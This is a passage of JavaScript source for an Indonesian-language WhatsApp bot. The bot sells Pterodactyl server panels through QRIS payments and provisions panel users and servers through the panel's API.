* [-] Harga : ${amount}
* [-] Akses : ${selectedPackage.access}`;

        // Kirim QR Code ke pengguna
        const qrMessage = await dhikaXs.sendMessage(m.chat, { 
            image: { url: paymentResponse.result.qrImageUrl }, 
            caption: paymentDetails 
        }, { quoted: m });

        // API URL untuk mengecek status pembayaran
        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.idOrkut}&keyorkut=${global.ApiOrkut}`;

        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Maksimal 5 menit
        const startTime = Date.now();

        // Fungsi untuk notifikasi dana masuk
        const sendFundsNotification = async (transactionDetails) => {
            try {
                await dhikaXs.sendMessage(m.chat, {
                    text: `*DANA MASUK TERDETEKSI*

*Detail Transaksi:*
• Jumlah: Rp. ${transactionDetails.amount}
• Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Status: Berhasil

* *Berikut Data - Data Reseller Panel*
* *Link : https://chat.whatsapp.com/EHLkqTlNXlVEvAmSA4UBdX*
* *Expired : Permanen*

Terima kasih telah melakukan transaksi!`,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                });
            } catch (notificationError) {
                console.error('Notification Error:', notificationError);
            }
        };

        // Cek status transaksi
        while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
            try {
                const response = await axios.get(apiUrl);
                const result = response.data;

                if (result?.amount && parseInt(result.amount) === totalAmount) {
                    // Hapus pesan QR Code
                    await dhikaXs.sendMessage(m.chat, { delete: qrMessage.key });

                    // Buat panel reseller untuk pengguna
                    await createAdminPanel(selectedPackage, m, totalAmount);

                    // Kirim notifikasi dana masuk
                    await sendFundsNotification({ amount: totalAmount });

                    isTransactionComplete = true;
                    break;
                }
            } catch (statusError) {
                console.error('Error checking payment status:', statusError);
            }
            await new Promise(resolve => setTimeout(resolve, 10000)); // Delay 10 detik
        }

        if (!isTransactionComplete) {
            return m.reply('Waktu pembayaran habis. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error in buyresellerpanel case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'buyadminpanel': {
    try {
        if (!m.sender) {
            return m.reply('Pengirim tidak terdeteksi.');
        }

        if (!db.users) {
            db.users = {};
        }

        if (!db.users[m.sender]) {
            db.users[m.sender] = { status_deposit: false };
        }

        // Cek jika ada transaksi yang belum diselesaikan
        if (db.users[m.sender].status_deposit) {
            return m.reply("*[ System Notice ]* Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
        }

        // Paket admin panel
        const adminPackages = {
            "permanen": { level: "permanen Admin", access: "Limited", harga: "20000" },
            "sebulan": { level: "sebulan Admin", access: "1 Bulan", harga: "10000" }
        };

        const teks = `
*#- Detail Paket Admin Panel Tersedia*
* Permanen (Rp. 20.000)
* Sebulan (Rp. 10.000)
*#- Selalu Berhati-hati jika melakukan transaksi. Terima kasih!*
        `;

        if (!text) return m.reply(teks);

        const cmd = text.toLowerCase();
        const Obj = adminPackages[cmd] || null;
        if (!Obj) return m.reply(teks);

        // Menghitung total biaya
        const amount = Number(Obj.harga);
        const fee = Math.floor(Math.random() * 10); // Biaya admin acak
        const totalAmount = amount + fee;

        // Proses pembayaran
        let pay;
        try {
            const paymentResponse = await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`);
            pay = await paymentResponse.json();

            if (!pay || !pay.result || !pay.result.transactionId) {
                throw new Error("Invalid payment response");
            }
        } catch (paymentError) {
            console.error('Payment API Error:', paymentError);
            return m.reply('Gagal membuat pembayaran. Silakan coba lagi atau hubungi admin.');
        }

        // Waktu transaksi dan format expired time
        const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000); // 5 menit
        const formattedTime = `${expirationTime.getHours().toString().padStart(2, '0')}:${expirationTime.getMinutes().toString().padStart(2, '0')}`;

        // Detail transaksi
        const paymentDetails = `*DETAIL TRANSAKSI*

╭——⪼
│• *Id Transaksi* : ${pay.result.transactionId}
│• *Jumlah Transaksi* : Rp. ${amount}
│• *Expired Time* : ${formattedTime} WIB
│• *Biaya Admin* : ${fee}
│• *Total Transaksi* : ${totalAmount}
╰——⪼

*Detail Produk Anda*
* [-] Beli Admin Panel Pterodactyl
* [-] Level Akses : ${Obj.level}
* [-] Harga : ${amount}
* [-] Akses : ${Obj.access}`;

        // Kirim QR Code ke pengguna
        const qrMessage = await dhikaXs.sendMessage(m.chat, {
            image: { url: pay.result.qrImageUrl },
            caption: paymentDetails
        }, { quoted: m });

        // Cek status pembayaran
        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.ApiOrkut}`;

        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Maksimal 5 menit
        const startTime = Date.now();

        while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
            try {
                const response = await axios.get(apiUrl);
                const result = response.data;

                if (result?.amount && parseInt(result.amount) === totalAmount) {
                    // Hapus pesan QR Code
                    await dhikaXs.sendMessage(m.chat, { delete: qrMessage.key });

                    // Buat panel admin untuk pengguna
                    await createAdminPanel(Obj, m, totalAmount);
                    isTransactionComplete = true;
                    break;
                }
            } catch (checkError) {
                console.error('Transaction Check Error:', checkError);
            }

            // Delay 10 detik
            await new Promise(resolve => setTimeout(resolve, 10000));
        }

        if (!isTransactionComplete) {
            return m.reply('Waktu pembayaran habis. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error in buyadminpanel case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'payment':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

 let teks = `
┌───「 *Killua Official market | secure 〽️* 」───
│ *Dana* : ${global.dana}
│ *Gopay* : ${global.gopay}
│ *Ovo* : ${global.ovo}
└───────────────────
`;

 await dhikaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Dhika Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case 'done': {
    try {
        // Validasi input
        if (!text) return m.reply('*[ System Notice ]* Format salah! Contoh: .done Nama Barang, Harga, Via Pembayaran');
        const args = text.split(',');
        if (args.length < 3) return m.reply('*[ System Notice ]* Pastikan formatnya sesuai! Contoh: .done Nama Barang, Harga, Via Pembayaran');

        const [namaBarang, harga, viaPembayaran] = args.map(arg => arg.trim());

        // Tanggal otomatis
        const currentDate = new Date();
        const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('id-ID', options);

        // Link video (GIF)
        const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

        // Format pesan
        const teks = `┌───「 *Detail Transaksi* 」───
│ *Nama Barang*: ${namaBarang}
│ *Harga*: ${harga}
│ *Via Pembayaran* :  ${viaPembayaran}
│ *Tanggal* :  ${formattedDate}
│*Testi* : ${global.link}
└───────────────────
*[INFO]* Terima Kasih Sudah Mempercayai Kami`;

        // Kirim pesan dengan tampilan chat
        await dhikaXs.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: teks,
            gifPlayback: true,
            gifAttribution: 1,
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Transaksi Selesai',
                    body: 'AanzCuyxzzz-V2',
                    mediaType: 1,
                    renderLargerThumbnail: false,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error('Error in done case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'unli-2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case 'unli-3': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case 'updomain3':{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain3 = newteks;

 await dhikaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await dhikaXs.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey3':{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey3 = newteks;
 return dhikaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

case 'upcapikey3':{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey3 = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await dhikaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await dhikaXs.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;

case 'qris': {
    if (!text) return m.reply('Masukkan nominal, contoh: #deposit 1000');
    const amount = parseInt(text);
    if (isNaN(amount)) return m.reply('Nominal tidak valid. Pastikan hanya angka, contoh: #deposit 1000');

    const fee = Math.floor(Math.random() * 101); // Biaya acak antara 0 - 100
    const totalAmount = amount + fee;

    try {
        // Membuat QRIS
        const pay = await (await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`)).json();

        const expirationTime = new Date(pay.result.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const tek = `*BERIKUT DETAIL PEMBAYARAN*\n\nID TRANSAKSI: ${pay.result.transactionId}\nJUMLAH TRANSAKSI: Rp. ${totalAmount}\n\nSilahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk pembayaran.`;
        await dhikaXs.sendMessage(m.chat, { image: { url: `${pay.result.qrImageUrl}` }, caption: `${tek}` }, { quoted: m });

        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.idOrkut}&keyorkut=${global.ApiOrkut}`;
        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000; // Waktu tunggu maksimal 5 menit
        const startTime = new Date().getTime();

        while (!isTransactionComplete && new Date().getTime() - startTime < maxWaitTime) {
            try {
                const response = await fetch(apiUrl);
                const result = await response.json();

                if (result && result.amount && parseInt(result.amount) === totalAmount) {
                    isTransactionComplete = true;

                    // Simpan data pengguna ke file JSON
                    const fs = require('fs');
                    const usersFilePath = 'src/users.json';
                    let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));

                    const userNumber = `${m.sender}`;
                    let user = usersData.find(user => user.nomer === userNumber);

                    if (user) {
                        user.balance = (parseInt(user.balance) || 0) + amount;
                    } else {
                        user = { nomer: userNumber, balance: amount };
                        usersData.push(user);
                        await dhikaXs.sendMessage(m.chat, { text: 'Akun Anda telah terdaftar otomatis karena tidak ditemukan di sistem. Selamat menggunakan layanan kami!' }, { quoted: m });
                    }

                    fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
                    const notification = `*PEMBAYARAN ANDA SELESAI!*\n\n*ID TRANSAKSI:* ${pay.result.transactionId}\n*JUMLAH DITAMBAHKAN:* Rp. ${amount}\n*PEMBAYARAN BERHASIL DITERIMA.*`;
                    await dhikaXs.sendMessage(m.chat, { text: notification }, { quoted: m });
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000)); // Tunggu 10 detik sebelum cek ulang
            }
        }

        if (!isTransactionComplete) {
            const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran. Silakan coba lagi dengan membuat transaksi baru.`;
            await dhikaXs.sendMessage(m.chat, { text: expiredText }, { quoted: m });
        }

    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        m.reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'chatbot': {
const microsoftCopilotNumber = '6283138852323@s.whatsapp.net';
if (!text) {
return m.reply("Silakan masukkan pesan yang ingin dikirim.");
}
await dhikaXs.sendMessage(microsoftCopilotNumber, {
text: text
});
if (global.responseListener) {
dhikaXs.ev.off('messages.upsert', global.responseListener);
}
global.responseListener = async (msg) => {
if (
msg.messages[0].key.remoteJid === microsoftCopilotNumber && 
msg.messages[0].message?.conversation
) {
const response = msg.messages[0].message.conversation;
await dhikaXs.sendMessage(m.chat, {
text: `${response}`
});
}
};
dhikaXs.ev.on('messages.upsert', global.responseListener);
}
break

case 'cpanel':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

 let teks = `
┌───「 *List Panel V1* 」───
│ 1gb *(Nama-User)*
│ 2gb *(Nama-User)*
│ 3gb *(Nama-User)*
│ 4gb *(Nama-User)*
│ 5gb *(Nama-User)*
│ unli *(Nama-User)*
└───────────────────
┌───「 *List Panel V2* 」───
│ 1gb-2 *(Nama-User)*
│ 2gb-2 *(Nama-User)*
│ 3gb-2 *(Nama-User)*
│ 4gb-2 *(Nama-User)*
│ 5gb-2 *(Nama-User)*
│ unli-2 *(Nama-User)*
└───────────────────
┌───「 *List Panel V3* 」───
│ 1gb-3 *(Nama-User)*
│ 2gb-3 *(Nama-User)*
│ 3gb-3 *(Nama-User)*
│ 4gb-3 *(Nama-User)*
│ 5gb-3 *(Nama-User)*
│ unli-3 *(Nama-User)*
└───────────────────
> *_© Developer KilluaDev*
`;

 await dhikaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Dhika Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case '1gb':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "1024"; // Memori unlimited
 let cpu = "500"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '2gb':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "2024"; // Memori unlimited
 let cpu = "1000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
